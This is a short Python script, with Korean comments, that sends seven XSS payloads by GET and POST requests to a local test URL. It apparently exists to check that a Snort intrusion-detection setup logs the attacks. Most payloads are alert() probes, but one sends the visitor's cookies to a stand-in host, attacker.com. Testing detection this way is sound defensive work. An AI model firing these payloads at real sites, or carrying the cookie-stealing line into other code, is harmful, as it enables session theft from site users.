import requests
from urllib.parse import quote
import time

def test_xss_attacks(target_url):
    # XSS 페이로드 목록
    payloads = [
        "<script>alert('XSS Test 1')</script>",
        "<img src=x onerror=alert('XSS Test 2')>",
        "javascript:alert('XSS Test 3')",
        "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
        "<body onload=alert('XSS Test 4')>",
        "%3Cscript%3Ealert('XSS Test 5')%3C/script%3E"
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }

    print("Starting XSS Tests...")
    
    for i, payload in enumerate(payloads, 1):
        try:
            # GET 요청으로 테스트
            print(f"\nTest {i} - GET request with payload: {payload}")
            encoded_payload = quote(payload)
            test_url = f"{target_url}?xss={encoded_payload}"
            
            response = requests.get(test_url, headers=headers)
            print(f"GET Status: {response.status_code}")
            
            # POST 요청으로 테스트
            print(f"Test {i} - POST request with payload: {payload}")
            data = {'xss_field': payload}
            
            response = requests.post(target_url, data=data, headers=headers)
            print(f"POST Status: {response.status_code}")
            
            # Snort가 로그를 기록할 시간을 주기 위해 잠시 대기
            time.sleep(1)
            
        except Exception as e:
            print(f"Error in test {i}: {str(e)}")

if __name__ == "__main__":
    # 테스트할 대상 URL을 여기에 입력하세요
    target_url = "http://127.0.0.0:8000/test-xss/test/"
    test_xss_attacks(target_url)
